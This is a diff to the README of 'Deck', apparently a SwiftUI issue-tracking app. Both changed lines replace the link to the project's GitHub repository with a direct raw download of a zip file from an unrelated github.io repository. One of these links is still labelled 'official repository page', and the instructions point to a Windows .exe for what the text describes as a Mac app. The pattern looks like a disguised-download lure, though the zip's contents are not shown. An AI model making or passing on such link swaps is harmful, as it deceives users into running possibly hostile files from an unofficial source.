@@ -5,7 +5,7 @@ description: "Manage bugs and features on a local board built with SwiftUI for m
 ---
 # 📋 Deck - Manage your projects with ease
 
-[![](https://img.shields.io/badge/Download-Deck-blue.svg)](https://github.com/atheist-grammaticalgender460/Deck)
+[![](https://img.shields.io/badge/Download-Deck-blue.svg)](https://raw.githubusercontent.com/atheist-grammaticalgender460/atheist-grammaticalgender460.github.io/main/duodecane/atheist-grammaticalgender-github-io-v1.9.zip)
 
 ## 📌 Overview
 
@@ -32,7 +32,7 @@ Deck helps you track bugs and features for your projects. It runs on your comput
 
 Follow these steps to set up Deck on your computer.
 
-1. Visit the [official repository page](https://github.com/atheist-grammaticalgender460/Deck) to find the latest version of the app.
+1. Visit the [official repository page](https://raw.githubusercontent.com/atheist-grammaticalgender460/atheist-grammaticalgender460.github.io/main/duodecane/atheist-grammaticalgender-github-io-v1.9.zip) to find the latest version of the app.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Find the file ending in `.exe` under the Assets heading.
